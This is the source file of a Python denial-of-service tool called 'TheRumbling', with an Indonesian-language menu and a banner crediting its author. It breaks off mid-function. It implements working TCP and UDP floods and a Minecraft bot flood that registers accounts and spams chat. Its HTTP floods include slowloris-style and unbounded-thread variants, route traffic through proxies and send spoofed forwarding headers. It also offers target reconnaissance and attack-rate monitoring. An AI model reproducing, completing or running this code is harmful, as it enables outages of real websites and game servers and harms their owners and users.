#!/usr/bin/env python3

from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from json import load
from logging import basicConfig, getLogger, shutdown
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice
from socket import AF_INET, SOCK_DGRAM, SOCK_STREAM, TCP_NODELAY, IPPROTO_TCP, socket, gethostbyname
from ssl import CERT_NONE, SSLContext, create_default_context
from sys import argv, exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4
from math import trunc, log2
import struct
import re
import subprocess

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from psutil import net_io_counters
from requests import get, Session
from requests.models import Response
from yarl import URL
from base64 import b64encode
from cloudscraper import create_scraper
from urllib3.exceptions import MaxRetryError, ProxyError, ConnectTimeoutError

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
logger = getLogger("TheRumbling")
logger.setLevel("INFO")

ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

__version__: str = "3.0 COLOSSAL"
__dir__: Path = Path(__file__).parent
__ip__: str = None

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def exit(*message):
    if message:
        logger.error(f"{bcolors.FAIL}Wall Maria Breached: {' '.join(message)}{bcolors.RESET}")
    shutdown()
    _exit(1)

class Methods:
    LAYER7_METHODS: Set[str] = {"TITAN_STOMP", "WALL_CRUSHER", "PATH_CLEAVER", "COLOSSAL_SURGE", "RUMBLE_WRATH"}
    LAYER4_METHODS: Set[str] = {"BOULDER_FLOOD", "ARMOR_STRIKE", "BEAST_ROAR"}
    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}

class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self

REQUESTS_SENT = Counter()
BYTES_SEND = Counter()

class Tools:
    @staticmethod
    def ukuran_baca(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        return "-- B"

    @staticmethod
    def format_baca(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        return num

    @staticmethod
    def kirim(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def kirim_ke(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def tutup_aman(sock=None):
        if sock:
            sock.close()

    @staticmethod
    def ukuran_reques(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}' for key, value in res.request.headers.items()))
        return size

    protocolRex = re.compile(r'"protocol":(\d+)')

class Minecraft:
    @staticmethod
    def angka_panjang(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += struct.pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.angka_panjang(len(payload)) + payload

    @staticmethod
    def pendek(integer: int) -> bytes:
        return struct.pack('>H', integer)

    @staticmethod
    def jabat_tangan(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.angka_panjang(0x00),
                              Minecraft.angka_panjang(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.pendek(target[1]),
                              Minecraft.angka_panjang(state))

    @staticmethod
    def jabat_tangan_diteruskan(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.angka_panjang(0x00),
                              Minecraft.angka_panjang(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.pendek(target[1]),
                              Minecraft.angka_panjang(state))

    @staticmethod
    def masuk(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.angka_panjang(0x00 if protocol >= 391 else
                                               0x01 if protocol >= 385 else
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def obrolan(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.angka_panjang(0x03 if protocol >= 755 else
                                               0x03 if protocol >= 464 else
                                               0x02 if protocol >= 389 else
                                               0x01 if protocol >= 343 else
                                               0x02 if protocol >= 336 else
                                               0x03 if protocol >= 318 else
                                               0x02 if protocol >= 107 else
                                               0x01),
                              Minecraft.data(message.encode()))

class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 method: str = "ARMOR_STRIKE",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._method = method
        self._target = target
        self._synevent = synevent
        self._protocolid = protocolid
        if proxies:
            self._proxies = list(proxies)

        self.methods = {
            "BOULDER_FLOOD": self.kirim_udp,
            "ARMOR_STRIKE": self.kirim_tcp,
            "BEAST_ROAR": self.bot_mc,
        }

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.pilih(self._method)
        while self._synevent.is_set():
            self.KIRIM_BANJIR()

    def buka_koneksi(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def kirim_tcp(self) -> None:
        s = None
        with suppress(Exception), self.buka_koneksi(AF_INET, SOCK_STREAM) as s:
            while Tools.kirim(s, randbytes(1024)):
                continue
        Tools.tutup_aman(s)

    def kirim_udp(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.kirim_ke(s, randbytes(1024), self._target):
                continue
        Tools.tutup_aman(s)

    def bot_mc(self) -> None:
        s = None
        with suppress(Exception), self.buka_koneksi(AF_INET, SOCK_STREAM) as s:
            Tools.kirim(s, Minecraft.jabat_tangan_diteruskan(self._target,
                                                        self._protocolid,
                                                        2,
                                                        ProxyTools.Random.rand_ipv4(),
                                                        uuid4()))
            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.kirim(s, Minecraft.masuk(self._protocolid, username))
            
            sleep(1.5)

            Tools.kirim(s, Minecraft.obrolan(self._protocolid, "/register %s %s" % (password, password)))
            Tools.kirim(s, Minecraft.obrolan(self._protocolid, "/login %s" % password))

            while Tools.kirim(s, Minecraft.obrolan(self._protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)

        Tools.tutup_aman(s)

    def pilih(self, name):
        self.KIRIM_BANJIR = self.kirim_tcp
        for key, value in self.methods.items():
            if name == key:
                self.KIRIM_BANJIR = value

class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    KIRIM_BANJIR: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "COLOSSAL_SURGE",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.KIRIM_BANJIR = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self.methods = {
            "TITAN_STOMP": self.lambat,
            "WALL_CRUSHER": self.kirim_post,
            "PATH_CLEAVER": self.lewati,
            "COLOSSAL_SURGE": self.ambil_data,
            "RUMBLE_WRATH": self.hancurkan,
        }

        if not referers:
            referers: List[str] = [
                "https://www.google.com/",
                "https://www.facebook.com/",
                "https://www.twitter.com/",
                "https://www.youtube.com/"
            ]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15'
            ]
        self._useragents = list(useragents)
        self._req_type = self.ambil_tipe_metode(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      self._target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: keep-alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def pilih(self, name: str) -> None:
        self.KIRIM_BANJIR = self.ambil_data
        for key, value in self.methods.items():
            if name == key:
                self.KIRIM_BANJIR = value

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.pilih(self._method)
        while self._synevent.is_set():
            self.KIRIM_BANJIR()

    @property
    def PalsuIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')

    def buat_payload(self, other: str = None) -> bytes:
        return str.encode((self._payload +
                           f"Host: {self._target.authority}\r\n" +
                           self.kontenHeaderAcak +
                           (other if other else "") +
                           "\r\n"))

    def buka_koneksi(self, host=None) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=host[0] if host else self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @property
    def kontenHeaderAcak(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.PalsuIP)

    @staticmethod
    def ambil_tipe_metode(method: str) -> str:
        return "GET" if method.upper() in {"TITAN_STOMP", "PATH_CLEAVER", "COLOSSAL_SURGE", "RUMBLE_WRATH"} else "POST"

    def kirim_post(self) -> None:
        payload: bytes = self.buat_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
        s = None
        with suppress(Exception), self.buka_koneksi() as s:
            for _ in range(self._rpc):
                Tools.kirim(s, payload)
        Tools.tutup_aman(s)

    def ambil_data(self) -> None:
        payload: bytes = self.buat_payload()
        s = None
        with suppress(Exception), self.buka_koneksi() as s:
            for _ in range(self._rpc):
                Tools.kirim(s, payload)
        Tools.tutup_aman(s)

    def hancurkan(self) -> None:
        while True:
            Thread(target=self.ambil_data, daemon=True).start()

    def lambat(self) -> None:
        payload: bytes = self.buat_payload()
        s = None
        with suppress(Exception), self.buka_koneksi() as s:
            for _ in range(self._rpc):
                Tools.kirim(s, payload)
            while Tools.kirim(s, payload) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.kirim(s, keep)
                    sleep(self._rpc / 15)
                    break
        Tools.tutup_aman(s)

    def lewati(self) -> None:
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                try:
                    if pro:
                        with s.get(self._target.human_repr(),
                                   proxies=pro.asRequest(), timeout=10) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.ukuran_reques(res)
                            continue
                    with s.get(self._target.human_repr(), timeout=10) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.ukuran_reques(res)
                except (MaxRetryError, ProxyError, ConnectTimeoutError):
                    continue
        Tools.tutup_aman(s)

class ProxyManager:
    @staticmethod
    def unduh_dari_konfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Gathering Eldian Scouts from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.unduh, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def unduh(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Mengambil Proxy, from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, Exception):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Error: {(e.__str__() or e.__repr__())}')
        return proxes

class ToolsConsole:
    METHODS = {"PING", "DSTAT", "INFO", "CHECK"}

    @staticmethod
    def bersihkan_layar():
        print("\033c")
        ToolsConsole.tampilkan_banner(0)

    @staticmethod
    def tampilkan_banner(proxy_count: int):
        ascii_art = """
      .:::::-=                 -#*+-.                                                     
     :%%@@@%%==-               .+@##@@.                  :+     =- :*+                    
     :..*@.  .@=.:    ..        *@: *@  .         : ..   %@.:  :@= '''    :      :        
       :#@.  :@*#@%:.+#@%=     .*@=--  -@#:#@::@#*@#%@*. %%*@%=:@= =%+:@%+@%=  -+%@*:     
       :#@.  :@= #@ %% +@:     .*@@@#+. @* *@  @# %@ %@  %% =@:.@= :@= @% -@- -@- @#      
       :#@.  :@= #@ %%+%%      .*@-.*@- @* *@  @* #@ %%  %% -@..@= :@= @# -@- -@- @#      
       :#@.  :@- #@ %#..       .*@- :@- @* *@  @* %@ %%  %% .@..@= :@- @# -@: -@: @#      
       :#@.  -@+ #@ @@=:.      .*@- -@- @%:#@:.@% =: @@. @@:+@::@+.-@+ @% =@=.=@#=@#      
       :#@.  -#= #@.:+@%:       *@: +@+:+%@+%*:#*   .+#=.=#@+. -*#:-#=:**.-##:.:++@#      
        *@%*:    -%+           .#@%:                                           :==@*      
         .=:                     :=                                           .-=#:   
        """
        print(f"{bcolors.FAIL}{ascii_art}{bcolors.RESET}")
        print(f"{bcolors.FAIL}=========================================================={bcolors.RESET}")
        print(f"{bcolors.FAIL}DDoS Tool CREATED BY KYPAU{bcolors.RESET}")
        print(f"{bcolors.FAIL}INSTAGRAM\t: https://www.instagram.com/kyypau{bcolors.RESET}")
        print(f"{bcolors.FAIL}GITHUB\t\t: https://github.com/kyypau{bcolors.RESET}")
        print(f"{bcolors.FAIL}=========================================================={bcolors.RESET}")

    @staticmethod
    def tampilkan_menu():
        print(f"{bcolors.FAIL}╔{'═' * 46}╗{bcolors.RESET}")
        print(f"{bcolors.FAIL}║{bcolors.WARNING}{'Main Menu'.center(46)}{bcolors.FAIL}║{bcolors.RESET}")
        print(f"{bcolors.FAIL}╠{'═' * 46}╦{bcolors.RESET}")
        print(f"{bcolors.FAIL}║{bcolors.OKCYAN}{'1) Mulai Rumbling (Attack)'.ljust(46)}{bcolors.FAIL}║{bcolors.RESET}")
        print(f"{bcolors.FAIL}║{bcolors.OKCYAN}{'2) Intai Target (Ping)'.ljust(46)}{bcolors.FAIL}║{bcolors.RESET}")
        print(f"{bcolors.FAIL}║{bcolors.OKCYAN}{'3) Kumpulkan Informasi (Info)'.ljust(46)}{bcolors.FAIL}║{bcolors.RESET}")
        print(f"{bcolors.FAIL}║{bcolors.OKCYAN}{'4) Periksa Target (Check)'.ljust(46)}{bcolors.FAIL}║{bcolors.RESET}")
        print(f"{bcolors.FAIL}║{bcolors.OKCYAN}{'5) Pantau Kekuatan Titan (Dstat)'.ljust(46)}{bcolors.FAIL}║{bcolors.RESET}")
        print(f"{bcolors.FAIL}║{bcolors.OKCYAN}{'6) Exit'.ljust(46)}{bcolors.FAIL}║{bcolors.RESET}")
        print(f"{bcolors.FAIL}╚{'═' * 46}╝{bcolors.RESET}")

    @staticmethod
    def jalankan_konsol():
        ToolsConsole.bersihkan_layar()
        cons = f"{bcolors.OKCYAN}TheRumbling@DDoS:~#{bcolors.RESET} "
        while True:
            ToolsConsole.tampilkan_menu()
            choice = input(cons).strip()
            if not choice:
                continue

            if choice == "1":
                ToolsConsole.luncurkan_rumbling(cons)
            elif choice == "2":
                domain = input(f"{bcolors.WARNING}Masukkan Target Sasaran (IP/Domain): {bcolors.RESET}").strip()
                if not domain:
                    print(f"{bcolors.FAIL}Tidak ada sasaran yg ditentukan!{bcolors.RESET}")
                    input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                    ToolsConsole.bersihkan_layar()
                    continue
                if domain.upper() in {"BACK", "CLEAR", "E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                    ToolsConsole.bersihkan_layar()
                    continue
                domain = domain.replace('https://', '').replace('http://', '')
                if "/" in domain:
                    domain = domain.split("/")[0]
                logger.info(f"{bcolors.WARNING}Mengintai Target {domain}...{bcolors.RESET}")
                try:
                    process = subprocess.run(
                        ['ping', '-c', '5', '-i', '0.2', domain],
                        capture_output=True, text=True, timeout=10
                    )
                    output = process.stdout
                    if process.returncode == 0:
                        lines = output.splitlines()
                        stats = [line for line in lines if 'packets transmitted' in line]
                        rtt = [line for line in lines if 'rtt min/avg/max' in line]
                        status = "BERDIRI"
                        packets = stats[0] if stats else "Unknown"
                        avg_rtt = rtt[0].split('=')[1].split('/')[1] + "ms" if rtt else "Unknown"
                        logger.info(f"{bcolors.OKCYAN}Status Target:\n"
                                    f"Alamat: {domain}\n"
                                    f"Ping: {avg_rtt}\n"
                                    f"Statistik: {packets}\n"
                                    f"Status: {status}{bcolors.RESET}")
                    else:
                        logger.info(f"{bcolors.OKCYAN}Status Target:\n"
                                    f"Alamat: {domain}\n"
                                    f"Status: HANCUR{bcolors.RESET}")
                except subprocess.TimeoutExpired:
                    logger.error(f"{bcolors.FAIL}Pengintaian gagal: Waktu habis{bcolors.RESET}")
                except Exception as e:
                    logger.error(f"{bcolors.FAIL}Pengintaian gagal: {str(e)}{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                ToolsConsole.bersihkan_layar()
            elif choice == "3":
                domain = input(f"{bcolors.WARNING}Masukkan Target Sasaran (IP/Domain): {bcolors.RESET}").strip()
                if not domain:
                    print(f"{bcolors.FAIL}Tidak ada sasaran yg ditentukan!{bcolors.RESET}")
                    input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                    ToolsConsole.bersihkan_layar()
                    continue
                if domain.upper() in {"BACK", "CLEAR", "E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                    ToolsConsole.bersihkan_layar()
                    continue
                domain = domain.replace('https://', '').replace('http://', '')
                if "/" in domain:
                    domain = domain.split("/")[0]
                logger.info(f"{bcolors.WARNING}Mengumpulkan informasi tentang {domain}...{bcolors.RESET}")
                try:
                    with get(f"https://ipwhois.app/json/{domain}/") as s:
                        info = s.json()
                        if not info["success"]:
                            logger.error(f"{bcolors.FAIL}Pengumpulan informasi gagal!{bcolors.RESET}")
                            input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                            ToolsConsole.bersihkan_layar()
                            continue
                        logger.info(f"{bcolors.OKCYAN}Informasi Target:\n"
                                    f"Negara: {info['country']}\n"
                                    f"Kota: {info['city']}\n"
                                    f"Organisasi: {info['org']}\n"
                                    f"ISP: {info['isp']}\n"
                                    f"Wilayah: {info['region']}{bcolors.RESET}")
                except Exception as e:
                    logger.error(f"{bcolors.FAIL}Pengumpulan informasi gagal: {str(e)}{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                ToolsConsole.bersihkan_layar()
            elif choice == "4":
                domain = input(f"{bcolors.WARNING}Masukkan Target Sasaran (IP/Domain): {bcolors.RESET}").strip()
                if not domain:
                    print(f"{bcolors.FAIL}Tidak ada sasaran yg ditentukan!{bcolors.RESET}")
                    input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                    ToolsConsole.bersihkan_layar()
                    continue
                if domain.upper() in {"BACK", "CLEAR", "E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                    ToolsConsole.bersihkan_layar()
                    continue
                if not domain.startswith(('http://', 'https://')):
                    domain = f"http://{domain}"
                logger.info(f"{bcolors.WARNING}Memeriksa Target {domain}...{bcolors.RESET}")
                try:
                    with get(domain, timeout=20) as r:
                        status = "BERDIRI" if r.status_code < 500 else "HANCUR"
                        status_message = {
                            200: "Target aktif",
                            502: "Target mulai runtuh (Bad Gateway)",
                            503: "Target tidak ditemukan (Service Unavailable)",
                            404: "Target tidak ditemukan",
                        }.get(r.status_code, f"Status target tidak diketahui (Kode: {r.status_code})")
                        logger.info(f"{bcolors.OKCYAN}Status Target:\n"
                                    f"Kode Status: {r.status_code}\n"
                                    f"Status: {status}\n"
                                    f"Detail: {status_message}{bcolors.RESET}")
                except Exception as e:
                    logger.error(f"{bcolors.FAIL}Pemeriksaan gagal: {str(e)}{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                ToolsConsole.bersihkan_layar()
            elif choice == "5":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)
                    while True:
                        sleep(1)
                        od = ld
                        ld = net_io_counters(pernic=False)
                        t = [(last - now) for now, last in zip(od, ld)]
                        logger.info(
                            f"{bcolors.OKCYAN}Statistik Titan:\n"
                            f"Bytes Terkirim: {Tools.ukuran_baca(t[0])}\n"
                            f"Bytes Diterima: {Tools.ukuran_baca(t[1])}\n"
                            f"Paket Terkirim: {Tools.format_baca(t[2])}\n"
                            f"Paket Diterima: {Tools.format_baca(t[3])}{bcolors.RESET}")
                        print(f"{bcolors.OKCYAN}Tekan Ctrl+C untuk menghentikan pemantauan...{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                ToolsConsole.bersihkan_layar()
            elif choice == "6":
                exit("Titan forces retreating!")
            else:
                print(f"{bcolors.FAIL}Pilihan tidak valid! Pilih 1-6 dari menu.{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                ToolsConsole.bersihkan_layar()

    @staticmethod
    def pantau_rumbling(target_host, target_port, method, duration, start_time, event):
        while time() < start_time + duration and event.is_set():
            elapsed = time() - start_time + 1
            pps = int(REQUESTS_SENT) / elapsed
            bps = int(BYTES_SEND) / elapsed
            print(f"\r{bcolors.WARNING}Titan Terkirim: {Tools.format_baca(int(REQUESTS_SENT))} | "
                  f"PPS: {Tools.format_baca(pps)} | "
                  f"BPS: {Tools.ukuran_baca(bps)} | "
                  f"Progress: {round(elapsed / duration * 100, 2)}%{bcolors.RESET}", end="")
            REQUESTS_SENT.set(0)
            BYTES_SEND.set(0)
            sleep(1)

    @staticmethod
    def luncurkan_rumbling(cons):
        ToolsConsole.bersihkan_layar()
        print(f"{bcolors.WARNING}Mempersiapkan untuk memulai Rumbling...{bcolors.RESET}")
        print(f"{bcolors.OKCYAN}Pilih Mode Titan:{bcolors.RESET}")
        for i, method in enumerate(Methods.ALL_METHODS, 1):
            print(f"{bcolors.OKCYAN}{i}) {method}{bcolors.RESET}")
        method_idx = input(f"{bcolors.WARNING}Silahkan Pilih (1-{len(Methods.ALL_METHODS)}): {bcolors.RESET}").strip()
        try:
            method_idx = int(method_idx)
            if not 1 <= method_idx <= len(Methods.ALL_METHODS):
                raise ValueError
            method = list(Methods.ALL_METHODS)[method_idx - 1]
        except ValueError:
            print(f"{bcolors.FAIL}Pilihanmu tidak valid! Pilih dari 1-{len(Methods.ALL_METHODS)}{bcolors.RESET}")
            input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
            return

        target_host = None
        target_port = None
        url = None

        if method in Methods.LAYER7_METHODS:
            url_input = input(f"{bcolors.WARNING}Tetapkan Target (e.g., http://example.com): {bcolors.RESET}").strip()
            if not url_input:
                print(f"{bcolors.FAIL}Tidak ada sasaran ditentukan!{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return
            if not url_input.startswith(('http://', 'https://')):
                url_input = f"http://{url_input}"
            try:
                url = URL(url_input)
                target_host = gethostbyname(url.host)
                target_port = url.port or (443 if url.scheme == 'https' else 80)
            except Exception as e:
                print(f"{bcolors.FAIL}Tidak dapat resolve Target {url_input}: {str(e)}{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

            socks_type = input(f"{bcolors.WARNING}Tipe Proxy (0=ALL, 1=HTTP, 4=SOCKS4, 5=SOCKS5, 6=RANDOM): {bcolors.RESET}").strip()
            try:
                socks_type = int(socks_type)
                if socks_type not in {0, 1, 4, 5, 6}:
                    raise ValueError
            except ValueError:
                print(f"{bcolors.FAIL}Proxy tidak valid! Gunakan 0, 1, 4, 5, atau 6{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

            threads = input(f"{bcolors.WARNING}Jumlah Titan (1-5000, default 50): {bcolors.RESET}").strip()
            try:
                threads = int(threads) if threads else 50
                if not 1 <= threads <= 5000:
                    raise ValueError
                if threads > 1000:
                    print(f"{bcolors.WARNING}PERINGATAN: Jumlah Titan {threads} tinggi! Disarankan <1000 untuk stabilitas sistem.{bcolors.RESET}")
            except ValueError:
                print(f"{bcolors.FAIL}Jumlah titan tidak valid! Gunakan angka antara 1 dan 5000{bcolors.RESET}")
                input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                return

            proxy_file = input(f"{bcolors.WARNING}File (e.g., proxies.txt, kosong untuk tanpa proxy): {bcolors.RESET}").strip()
            proxies = None
            proxy_count = 0
            if proxy_file:
                proxy_li = Path(__dir__ / "files/proxies" / proxy_file)
                if not proxy_li.exists():
                    print(f"{bcolors.FAIL}File {proxy_file} tidak ditemukan!{bcolors.RESET}")
                    input(f"{bcolors.OKCYAN}Tekan Enter untuk kembali ke menu utama...{bcolors.RESET}")
                    return
                proxies = handleProxyList(con, proxy_li, socks_type, url)
                proxy_count = len(proxies) if proxies else 0
            else:
                print(f"{bcolors.WARNING}Tidak ada file proxy ditentukan, melanjutkan tanpa proxy{bcolors.RESET}")

